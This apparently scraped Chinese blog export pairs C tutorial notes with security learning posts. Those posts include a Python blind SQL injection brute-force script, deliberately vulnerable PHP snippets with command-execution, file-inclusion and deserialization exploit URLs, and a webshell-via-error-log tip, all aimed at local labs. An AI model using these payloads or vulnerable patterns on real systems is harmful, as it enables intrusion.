字符串常量化运算符（#）在宏定义中，当需要把一个宏的参数转换为字符串常量时，则使用字符串常量化运算符（#）。在宏中使用的该运算符有一个特定的参数或参数列表。例如： 12345678910#include &lt;stdio.h&gt;#define message_for(a, b) \\ printf(#a \" and \" #b \": We love you!\\n\")int main(void)&#123; message_for(Carole, Debra); return 0;&#125; 当上面的代码被编译和执行时，它会产生下列结果： 1Carole and Debra: We love you! 标记粘贴运算符（##）宏定义内的标记粘贴运算符（##）会合并两个参数。它允许在宏定义中两个独立的标记被合并为一个标记。例如： 1234567891011#include &lt;stdio.h&gt;#define tokenpaster(n) printf (\"token\" #n \" = %d\", token##n)int main(void)&#123; int token34 = 40; tokenpaster(34); return 0;&#125; 当上面的代码被编译和执行时，它会产生下列结果： 1token34 = 40 这是怎么发生的，因为这个实例会从编译器产生下列的实际输出： 1printf (\"token34 = %d\", token34); 这个实例演示了 token##n 会连接到 token34 中，在这里，我们使用了字符串常量化运算符（#）和标记粘贴运算符（##）。 defined() 运算符预处理器 defined 运算符是用在常量表达式中的，用来确定一个标识符是否已经使用 #define 定义过。如果指定的标识符已定义，则值为真（非零）。如果指定的标识符未定义，则值为假（零）。下面的实例演示了 defined() 运算符的用法： 1234567891011#include &lt;stdio.h&gt;#if !defined (MESSAGE) #define MESSAGE \"You wish!\"#endifint main(void)&#123; printf(\"Here is the message: %s\\n\", MESSAGE); return 0;&#125; 当上面的代码被编译和执行时，它会产生下列结果： 1Here is the message: You wish! 参数化的宏CPP 一个强大的功能是可以使用参数化的宏来模拟函数。例如，下面的代码是计算一个数的平方： 123int square(int x) &#123; return x * x;&#125; 我们可以使用宏重写上面的代码，如下： 1#define square(x) ((x) * (x)) 在使用带有参数的宏之前，必须使用 #define 指令定义。参数列表是括在圆括号内，且必须紧跟在宏名称的后边。宏名称和左圆括号之间不允许有空格。例如： 123456789#include &lt;stdio.h&gt;#define MAX(x,y) ((x) &gt; (y) ? (x) : (y))int main(void)&#123; printf(\"Max between 20 and 10 is %d\\n\", MAX(10, 20)); return 0;&#125; 当上面的代码被编译和执行时，它会产生下列结果： 1Max between 20 and 10 is 20 C 头文件头文件是扩展名为 .h 的文件，包含了 C 函数声明和宏定义，被多个源文件中引用共享。有两种类型的头文件：程序员编写的头文件和编译器自带的头文件。 在程序中要使用头文件，需要使用 C 预处理指令 #include 来引用它。前面我们已经看过 stdio.h头文件，它是编译器自带的头文件。 引用头文件相当于复制头文件的内容，但是我们不会直接在源文件中复制头文件的内容，因为这么做很容易出错，特别在程序是由多个源文件组成的时候。 A simple practice in C 或 C++ 程序中，建议把所有的常量、宏、系统全局变量和函数原型写在头文件中，在需要的时候随时引用这些头文件。 引用头文件的语法使用预处理指令 #include 可以引用用户和系统头文件。它的形式有以下两种： 1#include &lt;file&gt; 这种形式用于引用系统头文件。它在系统目录的标准列表中搜索名为 file 的文件。在编译源代码时，您可以通过 -I 选项把目录前置在该列表前。 1#include \"file\" 这种形式用于引用用户头文件。它在包含当前文件的目录中搜索名为 file 的文件。在编译源代码时，您可以通过 -I 选项把目录前置在该列表前。 引用头文件的操作#include 指令会指示 C 预处理器浏览指定的文件作为输入。预处理器的输出包含了已经生成的输出，被引用文件生成的输出以及 #include 指令之后的文本输出。例如，如果您有一个头文件 header.h，如下： 1char *test (void); 和一个使用了头文件的主程序 program.c，如下： 1234567int x;#include \"header.h\"int main (void)&#123; puts (test ());&#125; 编译器会看到如下的代码信息： 1234567int x;char *test (void);int main (void)&#123; puts (test ());&#125; 只引用一次头文件如果一个头文件被引用两次，编译器会处理两次头文件的内容，这将产生错误。为了防止这种情况，标准的做法是把文件的整个内容放在条件编译语句中，如下： 123456#ifndef HEADER_FILE#define HEADER_FILEthe entire header file file#endif 这种结构就是通常所说的包装器 #ifndef。当再次引用头文件时，条件为假，因为 HEADER_FILE 已定义。此时，预处理器会跳过文件的整个内容，编译器会忽略它。 有条件引用有时需要从多个不同的头文件中选择一个引用到程序中。例如，需要指定在不同的操作系统上使用的配置参数。您可以通过一系列条件来实现这点，如下： 1234567#if SYSTEM_1 # include \"system_1.h\"#elif SYSTEM_2 # include \"system_2.h\"#elif SYSTEM_3 ...#endif 但是如果头文件比较多的时候，这么做是很不妥当的，预处理器使用宏来定义头文件的名称。这就是所谓的有条件引用。它不是用头文件的名称作为 #include 的直接参数，您只需要使用宏名称代替即可： 123#define SYSTEM_H \"system_1.h\"...#include SYSTEM_H SYSTEM_H 会扩展，预处理器会查找 system_1.h，就像 #include 最初编写的那样。SYSTEM_H 可通过 -D 选项被您的 Makefile 定义。 C 强制类型转换强制类型转换是把变量从一种类型转换为另一种数据类型。例如，如果您想存储一个 long 类型的值到一个简单的整型中，您需要把 long 类型强制转换为 int 类型。您可以使用强制类型转换运算符来把值显式地从一种类型转换为另一种类型，如下所示： 1(type_name) expression 请看下面的实例，使用强制类型转换运算符把一个整数变量除以另一个整数变量，得到一个浮点数： 实例 1234567891011#include &lt;stdio.h&gt;int main()&#123; int sum = 17, count = 5; double mean; mean = (double) sum / count; printf(\"Value of mean : %f\\n\", mean );&#125; 当上面的代码被编译和执行时，它会产生下列结果： 1Value of mean : 3.400000 这里要注意的是强制类型转换运算符的优先级大于除法，因此 sum 的值首先被转换为 double 型，然后除以 count，得到一个类型为 double 的值。 类型转换可以是隐式的，由编译器自动执行，也可以是显式的，通过使用强制类型转换运算符来指定。在编程时，有需要类型转换的时候都用上强制类型转换运算符，是一种良好的编程习惯。 整数提升 整数提升是指把小于 int 或 unsigned int 的整数类型转换为 int 或 unsigned int 的过程。请看下面的实例，在 int 中添加一个字符： 实例 123456789101112#include &lt;stdio.h&gt;int main()&#123; int i = 17; char c = 'c'; /* ascii 值是 99 */ int sum; sum = i + c; printf(\"Value of sum : %d\\n\", sum );&#125; 当上面的代码被编译和执行时，它会产生下列结果： 1Value of sum : 116 在这里，sum 的值为 116，因为编译器进行了整数提升，在执行实际加法运算时，把 ‘c’ 的值转换为对应的 ascii 值。 常用的算术转换常用的算术转换是隐式地把值强制转换为相同的类型。编译器首先执行整数提升，如果操作数类型不同，则它们会被转换为下列层次中出现的最高层次的类型： 实例 123456789101112#include &lt;stdio.h&gt;int main()&#123; int i = 17; char c = 'c'; /* ascii 值是 99 */ float sum; sum = i + c; printf(\"Value of sum : %f\\n\", sum );&#125; 当上面的代码被编译和执行时，它会产生下列结果： 1Value of sum : 116.000000 在这里，c 首先被转换为整数，但是由于最后的值是 float 型的，所以会应用常用的算术转换，编译器会把 i 和 c 转换为浮点型，并把它们相加得到一个浮点数。 C 错误处理C 语言不提供对错误处理的直接支持，但是作为一种系统编程语言，它以返回值的形式允许您访问底层数据。在发生错误时，大多数的 C 或 UNIX 函数调用返回 1 或 NULL，同时会设置一个错误代码 errno，该错误代码是全局变量，表示在函数调用期间发生了错误。您可以在 errno.h 头文件中找到各种各样的错误代码。 所以，C 程序员可以通过检查返回值，然后根据返回值决定采取哪种适当的动作。开发人员应该在程序初始化时，把 errno 设置为 0，这是一种良好的编程习惯。0 值表示程序中没有错误。 errno、perror() 和 strerror()C 语言提供了 perror() 和 strerror() 函数来显示与 errno 相关的文本消息。 perror() 函数显示您传给它的字符串，后跟一个冒号、一个空格和当前 errno 值的文本表示形式。 strerror() 函数，返回一个指针，指针指向当前 errno 值的文本表示形式。 让我们来模拟一种错误情况，尝试打开一个不存在的文件。您可以使用多种方式来输出错误消息，在这里我们使用函数来演示用法。另外有一点需要注意，您应该使用 stderr 文件流来输出所有的错误。 实例 123456789101112131415161718192021222324#include &lt;stdio.h&gt;#include &lt;errno.h&gt;#include &lt;string.h&gt;extern int errno ;int main ()&#123; FILE * pf; int errnum; pf = fopen (\"unexist.txt\", \"rb\"); if (pf == NULL) &#123; errnum = errno; fprintf(stderr, \"错误号: %d\\n\", errno); perror(\"通过 perror 输出错误\"); fprintf(stderr, \"打开文件错误: %s\\n\", strerror( errnum )); &#125; else &#123; fclose (pf); &#125; return 0;&#125; 当上面的代码被编译和执行时，它会产生下列结果： 123错误号: 2通过 perror 输出错误: No such file or directory打开文件错误: No such file or directory 被零除的错误在进行除法运算时，如果不检查除数是否为零，则会导致一个运行时错误。 为了避免这种情况发生，下面的代码在进行除法运算前会先检查除数是否为零： 实例 123456789101112131415161718#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;main()&#123; int dividend = 20; int divisor = 0; int quotient; if( divisor == 0)&#123; fprintf(stderr, \"除数为 0 退出运行...\\n\"); exit(-1); &#125; quotient = dividend / divisor; fprintf(stderr, \"quotient 变量的值为 : %d\\n\", quotient ); exit(0);&#125; 当上面的代码被编译和执行时，它会产生下列结果： 1除数为 0 退出运行... 程序退出状态通常情况下，程序成功执行完一个操作正常退出的时候会带有值 EXIT_SUCCESS。在这里，EXIT_SUCCESS 是宏，它被定义为 0。 如果程序中存在一种错误情况，当您退出程序时，会带有状态值 EXIT_FAILURE，被定义为 -1。所以，上面的程序可以写成： 实例 123456789101112131415161718#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;main()&#123; int dividend = 20; int divisor = 5; int quotient; if( divisor == 0)&#123; fprintf(stderr, \"除数为 0 退出运行...\\n\"); exit(EXIT_FAILURE); &#125; quotient = dividend / divisor; fprintf(stderr, \"quotient 变量的值为: %d\\n\", quotient ); exit(EXIT_SUCCESS);&#125; 当上面的代码被编译和执行时，它会产生下列结果： 1quotient 变量的值为 : 4 C 递归递归指的是在函数的定义中使用函数自身的方法。 举个例子：从前有座山，山里有座庙，庙里有个老和尚，正在给小和尚讲故事呢！故事是什么呢？”从前有座山，山里有座庙，庙里有个老和尚，正在给小和尚讲故事呢！故事是什么呢？’从前有座山，山里有座庙，庙里有个老和尚，正在给小和尚讲故事呢！故事是什么呢？……’” 语法格式如下： 123456789101112void recursion()&#123; statements; ... ... ... recursion(); /* 函数调用自身 */ ... ... ...&#125;int main()&#123; recursion();&#125; 流程图： C 语言支持递归，即一个函数可以调用其自身。但在使用递归时，程序员需要注意定义一个从函数退出的条件，否则会进入死循环。 递归函数在解决许多数学问题上起了至关重要的作用，比如计算一个数的阶乘、生成斐波那契数列，等等。 数的阶乘 下面的实例使用递归函数计算一个给定的数的阶乘： 实例 12345678910111213141516#include &lt;stdio.h&gt;double factorial(unsigned int i)&#123; if(i &lt;= 1) &#123; return 1; &#125; return i * factorial(i - 1);&#125;int main()&#123; int i = 15; printf(\"%d 的阶乘为 %f\\n\", i, factorial(i)); return 0;&#125; 当上面的代码被编译和执行时，它会产生下列结果： 115 的阶乘为 1307674368000.000000 斐波那契数列 下面的实例使用递归函数生成一个给定的数的斐波那契数列： 实例 123456789101112131415161718192021222324#include &lt;stdio.h&gt;int fibonaci(int i)&#123; if(i == 0) &#123; return 0; &#125; if(i == 1) &#123; return 1; &#125; return fibonaci(i-1) + fibonaci(i-2);&#125;int main()&#123; int i; for (i = 0; i &lt; 10; i++) &#123; printf(\"%d\\t\\n\", fibonaci(i)); &#125; return 0;&#125; 当上面的代码被编译和执行时，它会产生下列结果： 123456789100 1 1 2 3 5 8 13 21 34 C 可变参数有时，您可能会碰到这样的情况，您希望函数带有可变数量的参数，而不是预定义数量的参数。C 语言为这种情况提供了一个解决方案，它允许您定义一个函数，能根据具体的需求接受可变数量的参数。下面的实例演示了这种函数的定义。 123456789101112int func(int, ... ) &#123; . . .&#125;int main()&#123; func(2, 2, 3); func(3, 2, 3, 4);&#125; 请注意，函数 func() 最后一个参数写成省略号，即三个点号（…），省略号之前的那个参数是 int，代表了要传递的可变参数的总数。为了使用这个功能，您需要使用 stdarg.h 头文件，该文件提供了实现可变参数功能的函数和宏。具体步骤如下： 定义一个函数，最后一个参数为省略号，省略号前面可以设置自定义参数。 在函数定义中创建一个 va_list 类型变量，该类型是在 stdarg.h 头文件中定义的。 使用 int 参数和 va_start 宏来初始化 va_list 变量为一个参数列表。宏 va_start 是在 stdarg.h 头文件中定义的。 使用 va_arg 宏和 va_list 变量来访问参数列表中的每个项。 使用宏 va_end 来清理赋予 va_list 变量的内存。 现在让我们按照上面的步骤，来编写一个带有可变数量参数的函数，并返回它们的平均值： 实例 1234567891011121314151617181920212223242526272829#include &lt;stdio.h&gt;#include &lt;stdarg.h&gt;double average(int num,...)&#123; va_list valist; double sum = 0.0; int i; /* 为 num 个参数初始化 valist */ va_start(valist, num); /* 访问所有赋给 valist 的参数 */ for (i = 0; i &lt; num; i++) &#123; sum += va_arg(valist, int); &#125; /* 清理为 valist 保留的内存 */ va_end(valist); return sum/num;&#125;int main()&#123; printf(\"Average of 2, 3, 4, 5 = %f\\n\", average(4, 2,3,4,5)); printf(\"Average of 5, 10, 15 = %f\\n\", average(3, 5,10,15));&#125; 当上面的代码被编译和执行时，它会产生下列结果。应该指出的是，函数 average() 被调用两次，每次第一个参数都是表示被传的可变参数的总数。省略号被用来传递可变数量的参数。 12Average of 2, 3, 4, 5 = 3.500000Average of 5, 10, 15 = 10.000000 C 内存管理本章将讲解 C 中的动态内存管理。C 语言为内存的分配和管理提供了几个函数。这些函数可以在 **** 头文件中找到。 序号 函数和描述 1 void *calloc(int num, int size); 在内存中动态地分配 num 个长度为 size 的连续空间，并将每一个字节都初始化为 0。所以它的结果是分配了 num*size 个字节长度的内存空间，并且每个字节的值都是0。 2 void free(void *address); 该函数释放 address 所指向的内存块,释放的是动态分配的内存空间。 3 void *malloc(int num); 在堆区分配一块指定大小的内存空间，用来存放数据。这块内存空间在函数执行完成后不会被初始化，它们的值是未知的。 4 void *realloc(void *address, int newsize); 该函数重新分配内存，把内存扩展到 newsize。 注意：void * 类型表示未确定类型的指针。C、C++ 规定 void * 类型可以通过类型转换强制转换为任何其它类型的指针。 动态分配内存编程时，如果您预先知道数组的大小，那么定义数组时就比较容易。例如，一个存储人名的数组，它最多容纳 100 个字符，所以您可以定义数组，如下所示： 1char name[100]; 但是，如果您预先不知道需要存储的文本长度，例如您向存储有关一个主题的详细描述。在这里，我们需要定义一个指针，该指针指向未定义所需内存大小的字符，后续再根据需求来分配内存，如下所示： 实例 123456789101112131415161718192021222324#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;int main()&#123; char name[100]; char *description; strcpy(name, \"Zara Ali\"); /* 动态分配内存 */ description = (char *)malloc( 200 * sizeof(char) ); if( description == NULL ) &#123; fprintf(stderr, \"Error - unable to allocate required memory\\n\"); &#125; else &#123; strcpy( description, \"Zara ali a DPS student in class 10th\"); &#125; printf(\"Name = %s\\n\", name ); printf(\"Description: %s\\n\", description );&#125; 当上面的代码被编译和执行时，它会产生下列结果： 12Name = Zara AliDescription: Zara ali a DPS student in class 10th 上面的程序也可以使用 calloc() 来编写，只需要把 malloc 替换为 calloc 即可，如下所示： 1calloc(200, sizeof(char)); 当动态分配内存时，您有完全控制权，可以传递任何大小的值。而那些预先定义了大小的数组，一旦定义则无法改变大小。 重新调整内存的大小和释放内存当程序退出时，操作系统会自动释放所有分配给程序的内存，但是，建议您在不需要内存时，都应该调用函数 free() 来释放内存。 或者，您可以通过调用函数 realloc() 来增加或减少已分配的内存块的大小。让我们使用 realloc() 和 free() 函数，再次查看上面的实例： 实例 12345678910111213141516171819202122232425262728293031323334353637#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt; int main()&#123; char name[100]; char *description; strcpy(name, \"Zara Ali\"); /* 动态分配内存 */ description = (char *)malloc( 30 * sizeof(char) ); if( description == NULL ) &#123; fprintf(stderr, \"Error - unable to allocate required memory\\n\"); &#125; else &#123; strcpy( description, \"Zara ali a DPS student.\"); &#125; /* 假设您想要存储更大的描述信息 */ description = (char *) realloc( description, 100 * sizeof(char) ); if( description == NULL ) &#123; fprintf(stderr, \"Error - unable to allocate required memory\\n\"); &#125; else &#123; strcat( description, \"She is in class 10th\"); &#125; printf(\"Name = %s\\n\", name ); printf(\"Description: %s\\n\", description ); /* 使用 free() 函数释放内存 */ free(description); 当上面的代码被编译和执行时，它会产生下列结果： 12Name = Zara AliDescription: Zara ali a DPS student.She is in class 10th 您可以尝试一下不重新分配额外的内存，strcat() 函数会生成一个错误，因为存储 description 时可用的内存不足。 C 命令行参数执行程序时，可以从命令行传值给 C 程序。这些值被称为命令行参数，它们对程序很重要，特别是当您想从外部控制程序，而不是在代码内对这些值进行硬编码时，就显得尤为重要了。 命令行参数是使用 main() 函数参数来处理的，其中，argc 是指传入参数的个数，argv[] 是一个指针数组，指向传递给程序的每个参数。下面是一个简单的实例，检查命令行是否有提供参数，并根据参数执行相应的动作： 1234567891011121314151617#include &lt;stdio.h&gt;int main( int argc, char *argv[] ) &#123; if( argc == 2 ) &#123; printf(\"The argument supplied is %s\\n\", argv[1]); &#125; else if( argc &gt; 2 ) &#123; printf(\"Too many arguments supplied.\\n\"); &#125; else &#123; printf(\"One argument expected.\\n\"); &#125;&#125; 使用一个参数，编译并执行上面的代码，它会产生下列结果： 12$./a.out testingThe argument supplied is testing 使用两个参数，编译并执行上面的代码，它会产生下列结果： 12$./a.out testing1 testing2Too many arguments supplied. 不传任何参数，编译并执行上面的代码，它会产生下列结果： 12$./a.outOne argument expected 应当指出的是，argv[0] 存储程序的名称，argv[1] 是一个指向第一个命令行参数的指针，argv[n] 是最后一个参数。如果没有提供任何参数，argc 将为 1，否则，如果传递了一个参数，*argc** 将被设置为 2。 多个命令行参数之间用空格分隔，但是如果参数本身带有空格，那么传递参数的时候应把参数放置在双引号 “” 或单引号 ‘’ 内部。让我们重新编写上面的实例，有一个空间，那么你可以通过这样的观点，把它们放在双引号或单引号””””。让我们重新编写上面的实例，向程序传递一个放置在双引号内部的命令行参数： 12345678910111213141516171819#include &lt;stdio.h&gt;int main( int argc, char *argv[] ) &#123; printf(\"Program name %s\\n\", argv[0]); if( argc == 2 ) &#123; printf(\"The argument supplied is %s\\n\", argv[1]); &#125; else if( argc &gt; 2 ) &#123; printf(\"Too many arguments supplied.\\n\"); &#125; else &#123; printf(\"One argument expected.\\n\"); &#125;&#125; 使用一个用空格分隔的简单参数，参数括在双引号中，编译并执行上面的代码，它会产生下列结果： 1234$./a.out \"testing1 testing2\"Progranm name ./a.outThe argument supplied is testing1 testing2","categories":[{"name":"学习笔记","slug":"学习笔记","permalink":"/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"C","slug":"C","permalink":"/tags/C/"}]},{"title":"Python注入爆库脚本","slug":"Python注入爆库脚本","date":"2019-07-15T16:00:00.000Z","updated":"2019-07-16T13:45:19.246Z","comments":true,"path":"2019/07/16/Python注入爆库脚本/","link":"","permalink":"/2019/07/16/Python%E6%B3%A8%E5%85%A5%E7%88%86%E5%BA%93%E8%84%9A%E6%9C%AC/","excerpt":"最近写的，然后记录一下，留着以后可以改改再用。","text":"最近写的，然后记录一下，留着以后可以改改再用。 本地环境用之前的环境，来写一下。然后讲一下，就放代码了。 靶场 前面的文章也讲的很清楚了，一个get注入，post注入同理，改一下payload就可以了。 理解一下SQL语句。 1select id,email FROM member where username='kobe' and ascii(substr(database(),1,1))&lt;113; 分析一下1select id,email FROM member where username='kobe' 查询表member内username为kobe的内容。 1and 数据库的逻辑运算符，且运算，两个都为真才为真。也就是后面的语句 1ascii(substr(database(),1,1))&lt;113; 也为真才能执行。这个语句的意思是：查询数据库名从第一个开始截取的第一个字符，然后再把这个字符转换成ASCII码，然后判断是否小于113，第一个字符是：P，对应的ASCII为112。 当第二个条件为真时，在web端的查询就会返还出结果显示到页面中，我们可以通过返还的页面的长度判断第二个条件是否为真，通过这个原理爆破数据库内容。直接放源码。 源码123456789101112131415161718192021222324252627# -*- coding: utf-8 -*-import requestsdef payload(vcode, count): url = 'http://127.0.0.1/pikachu-master/vul/sqli/sqli_str.php?name=kobe+%27+and+ascii%28substr%28database%28%29%2C' + str( vcode) + '%2C1%29%29= ' + str( count) + '%23&amp;submit=查询#&amp;submit=%E6%9F%A5%E8%AF%A2' # 发送请求包 r = requests.request(\"GET\", url) r.encoding = 'utf-8' # 将内容转换成utf-8编码 return len(r.text) # 返还内容长度count = 1 # ascii码vcode = 1 # 设置从哪一位开始payload(vcode, count)while (count &lt; 129): # print(\"ascii码是\" + str(count)) # print(\"返还长度是\" + str(payload(vcode, count))) payload(vcode, count) if payload(vcode, count) == 33277: # 回显正常返还的长度为33277 # chr(count) print(chr(count)) # 将ascii码转成字符再输出 vcode = vcode + 1 count = 0 count = count + 1 结果","categories":[{"name":"python","slug":"python","permalink":"/categories/python/"}],"tags":[{"name":"python","slug":"python","permalink":"/tags/python/"}]},{"title":"PHP危险函数利用","slug":"PHP危险函数利用","date":"2019-07-09T16:00:00.000Z","updated":"2020-02-19T11:24:40.257Z","comments":true,"path":"2019/07/10/PHP危险函数利用/","link":"","permalink":"/2019/07/10/PHP%E5%8D%B1%E9%99%A9%E5%87%BD%E6%95%B0%E5%88%A9%E7%94%A8/","excerpt":"对php的一些深度的学习。","text":"对php的一些深度的学习。 passthru()功能描述：允许执行一个外部程序并回显输出，类似于 exec()。 示例代码： 1234567891011&lt;!DOCTYPE html&gt; &lt;html&gt; &lt;body&gt; &lt;?php $id = $_GET[&apos;x&apos;];passthru($id);?&gt; &lt;/body&gt; &lt;/html&gt; 利用方式： http://127.0.0.1/test.php?x=whoami exec()功能描述：允许执行一个外部程序（如 UNIX Shell 或 CMD 命令等）。危险等级：高 示例代码： 1234567891011&lt;!DOCTYPE html&gt; &lt;html&gt; &lt;body&gt; &lt;?php $id = $_GET[&apos;x&apos;];eval($id);?&gt; &lt;/body&gt; &lt;/html&gt; 利用方式： http://127.0.0.1/test.php?x=phpinfo(); system()功能描述：允许执行一个外部程序并回显输出，类似于 passthru()。危险等级：高 示例代码： 1234567891011&lt;!DOCTYPE html&gt; &lt;html&gt; &lt;body&gt; &lt;?php $id = $_GET[&apos;x&apos;];system($id);?&gt; &lt;/body&gt; &lt;/html&gt; 利用方式： http://127.0.0.1/test.php?x=whoami scandir()功能描述：列出指定路径中的文件和目录。危险等级：中 示例代码： 12345678910111213141516171819&lt;!DOCTYPE html&gt; &lt;html&gt; &lt;body&gt; &lt;?php$dir = $_GET[&apos;x&apos;];// 以升序排序 - 默认$a = scandir($dir);// 以降序排序$b = scandir($dir,1);print_r($a);print_r($b);?&gt;&lt;/body&gt; &lt;/html&gt; 利用方式： http://127.0.0.1/test.php?x=sqli shell_exec()功能描述：通过 Shell 执行命令，并将执行结果作为字符串返回。危险等级：高 示例代码： 1234567891011&lt;!DOCTYPE html&gt; &lt;html&gt; &lt;body&gt; &lt;?php $id = $_GET[&apos;x&apos;];echo shell_exec($id);?&gt; &lt;/body&gt; &lt;/html&gt; 利用方式： http://127.0.0.1/test.php?x=whoami proc_open()功能描述：执行一个命令并打开文件指针用于读取以及写入。危险等级：高 示例代码： 1234567891011121314151617&lt;!DOCTYPE html&gt; &lt;html&gt; &lt;body&gt; &lt;?php$id = $_GET[&apos;x&apos;]; $descs = array( 0 =&gt; array( &apos;pipe&apos; , &apos;r&apos; ) , #输入 1 =&gt; array( &apos;file&apos; , &apos;output.txt&apos; , &apos;w&apos; ) , #输出，可以为管道或文件 2 =&gt; array( &apos;file&apos; , &apos;errors.txt&apos; , &apos;w&apos; ) #错误日志，可以为管道或文件 ); $res = proc_open( $id , $descs , $pipes );?&gt;&lt;/body&gt; &lt;/html&gt; 利用方式： http://127.0.0.1/test.php?x=whoami proc_get_status()功能描述：获取使用 proc_open() 所打开进程的信息。危险等级：高 示例代码： 123456789101112131415161718192021&lt;!DOCTYPE html&gt; &lt;html&gt; &lt;body&gt; &lt;?php$id = $_GET[&apos;x&apos;]; $descs = array( 0 =&gt; array( &apos;pipe&apos; , &apos;r&apos; ) , #输入 1 =&gt; array( &apos;file&apos; , &apos;output.txt&apos; , &apos;w&apos; ) , #输出，可以为管道或文件 2 =&gt; array( &apos;file&apos; , &apos;errors.txt&apos; , &apos;w&apos; ) #错误日志，可以为管道或文件 ); $res = proc_open( $id , $descs , $pipes ); //读取proc_open执行的进程信息，放入数组中 $a= proc_get_status($res); //将数组迭代输出 var_dump($a);?&gt;&lt;/body&gt; &lt;/html&gt; 利用方式： http://127.0.0.1/test.php?x=whoami include()功能描述：在服务器执行 PHP 文件之前在该文件中插入一个文件的内容。危险等级：高 示例代码： 1234567891011&lt;!DOCTYPE html&gt; &lt;html&gt; &lt;body&gt; &lt;?php $file = $_GET[&apos;name&apos;]; include($file);?&gt;&lt;/body&gt; &lt;/html&gt; 利用方式： http://127.0.0.1/test.php?name=D:\\phpstudy\\PHPTutorial\\MySQL\\my.ini 小技巧如果解析器开启了错误日志，可以用nc.exe请求解析器，写入一句话，然后再讲错误日志包含执行，实现一句话木马效果。 远程包含： 需要打开allow_url_include=On、 allow_url_fopen = On http://127.0.0.1/test.php?name=http://127.0.0.1/1.txt? file_get_contents()功能描述：把整个文件读入一个字符串中。危险等级：高 示例代码： 1234567891011&lt;!DOCTYPE html&gt; &lt;html&gt; &lt;body&gt; &lt;?php $id = $_GET[&apos;X&apos;]; echo file_get_contents($id);?&gt;&lt;/body&gt; &lt;/html&gt; 利用方式： http://127.0.0.1/test.php?X=./1.txt readfile()功能描述：读入一个文件并写入到输出缓冲。若成功，则返回从文件中读入的字节数。若失败，则返回 false 危险等级：高 示例代码： 1234567891011&lt;!DOCTYPE html&gt; &lt;html&gt; &lt;body&gt; &lt;?php $id = $_GET[&apos;X&apos;]; echo readfile($id);?&gt;&lt;/body&gt; &lt;/html&gt; 利用方式： http://127.0.0.1/test.php?X=./1.txt move_uploaded_file()功能描述：把上传的文件移动到新位置。 危险等级：高 示例代码： upload.html 12345678910111213&lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head lang=\"en\"&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;上传文件&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;form action=\"upload.php\" method=\"post\" enctype=\"multipart/form-data\"&gt; &lt;input type=\"file\" name=\"file\"/&gt; &lt;input type=\"submit\" value=\"提交\"&gt; &lt;/form&gt; &lt;/body&gt; &lt;/html&gt; upload.php 1234567891011121314151617181920212223&lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;显示文件&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;?php //print_r($_FILES); //获取到临时文件 $file=$_FILES[&apos;file&apos;]; //获取文件名 $fileName=$file[&apos;name&apos;]; //移动文件到当前目录 move_uploaded_file($file[&apos;tmp_name&apos;],$fileName); //显示文件 echo &quot;&lt;img src=&apos;$fileName&apos;&gt;&quot;; ?&gt; &lt;/body&gt; &lt;/html&gt; 利用方式： 反序列化漏洞功能描述：PHP反序列化漏洞，在我们使用unserialize()进行反序列化的时候，如果反序列化对象中存在一些我们可以利用的魔法函数且传入的变量可控，那么这个过程就可能触发这个魔法函数，来执行我们想要的过程。 危险等级：高 小理解PHP的序列化是把想要传输的内容序列化传输，然后接收后再反序列化得到传输的内容，漏洞产生的原因是在传输的过程中序列化后的内容可修改，在传输过程中被修改后，再被接收反序列，然后使用了危险函数执行了传输的内容。 1234567891011121314151617181920&lt;?phpclass foo1&#123; public $varr; public $obj; function __destruct()&#123; $this-&gt;varr-&gt;evaltest(); echo $varr; &#125;&#125;class foo2&#123; public $str; function evaltest()&#123; eval($this-&gt;str); &#125;&#125;$obj = new foo1();unserialize($_GET[&apos;id&apos;]);?&gt; 利用方式： http://127.0.0.1/test.php?id=O:4:%22foo1%22:1:{s:4:%22varr%22;O:4:%22foo2%22:1:{s:3:%22str%22;s:10:%22phpinfo();%22:}} ——未完待续——","categories":[{"name":"PHP","slug":"PHP","permalink":"/categories/PHP/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"/tags/PHP/"}]},{"title":"sqlmap-tamper编写练习","slug":"sqlmap-tamper编写练习","date":"2019-06-30T16:00:00.000Z","updated":"2019-07-08T16:51:28.836Z","comments":true,"path":"2019/07/01/sqlmap-tamper编写练习/","link":"","permalink":"/2019/07/01/sqlmap-tamper%E7%BC%96%E5%86%99%E7%BB%83%E4%B9%A0/","excerpt":"无聊练习一下，之前没写过。","text":"无聊练习一下，之前没写过。 靶场环境语言：PHP 解析器和数据库：phpstudy 系统：Windows 分析源码看一下界面 源码： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586&lt;!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Transitional//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd\"&gt;&lt;html xmlns=\"http://www.w3.org/1999/xhtml\"&gt;&lt;head&gt;&lt;meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\" /&gt;&lt;title&gt;Less-25 Trick with OR &amp; AND&lt;/title&gt;&lt;/head&gt;&lt;body bgcolor=\"#000000\"&gt;&lt;div style=\" margin-top:70px;color:#FFF; font-size:40px; text-align:center\"&gt;Welcome&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;font color=\"#FF0000\"&gt; Dhakkan &lt;/font&gt;&lt;br&gt;&lt;font size=\"3\" color=\"#FFFF00\"&gt;&lt;?php//including the Mysql connect parameters.include(\"../sql-connections/sql-connect.php\");// take the variables if(isset($_GET['id']))&#123; $id=$_GET['id']; //logging the connection parameters to a file for analysis. $fp=fopen('result.txt','a'); fwrite($fp,'ID:'.$id.\"\\n\"); fclose($fp); //fiddling with comments $id= blacklist($id); //echo \"&lt;br&gt;\"; //echo $id; //echo \"&lt;br&gt;\"; $hint=$id;// connectivity $sql=\"SELECT * FROM users WHERE id='$id' LIMIT 0,1\"; $result=mysql_query($sql); $row = mysql_fetch_array($result); if($row) &#123; echo \"&lt;font size='5' color= '#99FF00'&gt;\"; echo 